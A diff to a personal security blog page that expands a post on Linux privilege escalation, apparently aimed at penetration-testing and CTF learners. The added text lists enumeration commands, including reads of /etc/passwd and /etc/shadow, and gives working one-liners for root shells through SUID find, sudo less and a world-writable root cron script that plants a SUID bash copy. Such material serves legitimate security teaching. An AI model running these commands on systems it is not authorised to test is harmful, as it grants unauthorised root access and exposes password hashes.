@@ -55,32 +55,64 @@
     <article id="post">
       <h2 class="section-title"><span class="prompt">#</span> ~/blog/posts/linux-privesc</h2>
       <div class="divider">---</div>
-      <p class="blog-meta">2026-04-10 &middot; 6 min read</p>
+      <p class="blog-meta">2026-04-10 &middot; 15 min read</p>
 
       <div class="post-content">
         <p>$ cat linux-privesc-basics.md</p>
-<h3>Enumerate First</h3>
-<p>Run these to understand the target:</p>
-<pre><code class="language-bash">uname -a
+<h3>Introduction</h3>
+<p>You've popped a shell on a Linux box, but you're logged in as <code>www-data</code> or a low-privileged user. The goal now is to get <code>root</code>. Privilege escalation on Linux usually boils down to finding misconfigurations, weak permissions, or outdated software.</p>
+<h3>1. Enumerate First</h3>
+<p>Enumeration is the key to privilege escalation. You need to gather as much information about the system as possible before firing off exploits.</p>
+<p>Run these commands to understand the target environment:</p>
+<pre><code class="language-bash"><span class="hl-cmt"># System Information</span>
+uname -a
 <span class="hl-bi">cat</span> /etc/os-release
+hostname
+
+<span class="hl-cmt"># User &amp; Group Info</span>
+id
+<span class="hl-bi">cat</span> /etc/passwd
 <span class="hl-bi">sudo</span> -l
-<span class="hl-bi">ls</span> -la /etc/passwd /etc/shadow
-<span class="hl-bi">find</span> / -perm -<span class="hl-num">4000</span> <span class="hl-num">2</span>&gt;/dev/null
-<span class="hl-bi">cat</span> /etc/crontab
-ss -tuln</code></pre>
-<h3>Common Vectors</h3>
-<ul>
-<li><strong>SUID Binaries</strong> — Find binaries with the SUID bit that can be exploited</li>
-<li><strong>Sudo Misconfigurations</strong> — Check if you can run commands as root without a password</li>
-<li><strong>Kernel Exploits</strong> — Old kernels may have known privilege escalation exploits</li>
-<li><strong>Cron Jobs</strong> — Writable scripts executed by root</li>
-</ul>
+
+<span class="hl-cmt"># Network Information</span>
+ss -tuln
+arp -a
+ip a
+
+<span class="hl-cmt"># Search for interesting files</span>
+<span class="hl-bi">find</span> / -perm -<span class="hl-num">4000</span> -type f <span class="hl-num">2</span>&gt;/dev/null  <span class="hl-cmt"># Find SUID binaries</span>
+<span class="hl-bi">find</span> / -writable -type d <span class="hl-num">2</span>&gt;/dev/null    <span class="hl-cmt"># Find writable directories</span>
+<span class="hl-bi">cat</span> /etc/crontab                        <span class="hl-cmt"># Look at scheduled tasks</span></code></pre>
+<h3>2. Common Escalation Vectors</h3>
+<h3>SUID Binaries</h3>
+<p>SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. When a binary with the SUID bit set is executed, it runs with the privileges of the file owner (often root).</p>
+<p>If an administrator misconfigures a common binary (like <code>vim</code>, <code>find</code>, or <code>nmap</code>) by setting the SUID bit, you can exploit it to spawn a root shell.</p>
+<p><strong>Example using <code>find</code>:</strong> If <code>find</code> has the SUID bit set:</p>
+<pre><code class="language-bash"><span class="hl-bi">find</span> . -<span class="hl-kw">exec</span> /bin/sh -p \; -quit</code></pre>
+<p><em>(Always check <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> for exploitable commands!)</em></p>
+<h3>Sudo Misconfigurations</h3>
+<p>Sometimes, administrators allow users to run specific commands as root without a password via the <code>/etc/sudoers</code> file. You can check this by running <code>sudo -l</code>.</p>
+<p><strong>Example:</strong> If <code>sudo -l</code> shows you can run <code>/usr/bin/less</code> without a password:</p>
+<pre><code class="language-bash"><span class="hl-bi">sudo</span> less /etc/shadow
+<span class="hl-cmt"># Inside less, type:</span>
+!/bin/sh</code></pre>
+<p>This drops you into a root shell!</p>
+<h3>Cron Jobs</h3>
+<p>Cron jobs are scheduled tasks. If root is executing a script periodically, and that script is writable by your low-privileged user, you can inject malicious code into it.</p>
+<p><strong>Example:</strong> If <code>/opt/cleanup.sh</code> is running as root every 5 minutes and is world-writable:</p>
+<pre><code class="language-bash"><span class="hl-bi">echo</span> <span class="hl-str">&quot;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&quot;</span> &gt;&gt; /opt/cleanup.sh
+<span class="hl-cmt"># Wait 5 minutes...</span>
+/tmp/rootbash -p</code></pre>
+<h3>Kernel Exploits</h3>
+<p>If the machine is running an outdated kernel (e.g., Linux 2.6 or 3.x), it might be vulnerable to well-known exploits like <em>Dirty COW</em> (CVE-2016-5195) or <em>PwnKit</em> (CVE-2021-4034). <em>Warning: Kernel exploits can crash the system. Use them as a last resort in production environments.</em></p>
 <h3>Automation Tools</h3>
+<p>Manual enumeration takes time. Use these scripts to speed up the process:</p>
 <ul>
-<li><strong>LinPEAS</strong> — Comprehensive enumeration script</li>
-<li><strong>GTFOBins</strong> — Exploitable SUID binaries reference</li>
-<li><strong>Linux Exploit Suggester</strong> — Checks kernel version against known exploits</li>
+<li><strong>LinPEAS</strong> — The gold standard for Linux enumeration. It highlights potential paths in red/yellow.</li>
+<li><strong>Linux Exploit Suggester</strong> — Checks the kernel version against a database of known exploits.</li>
+<li><strong>Pspy</strong> — Monitors processes without needing root permissions. Great for finding hidden cron jobs.</li>
 </ul>
+<p>Remember: Enumeration is a loop. If you find new credentials or access a new user, start the enumeration process over from the beginning!</p>
 
       </div>
 
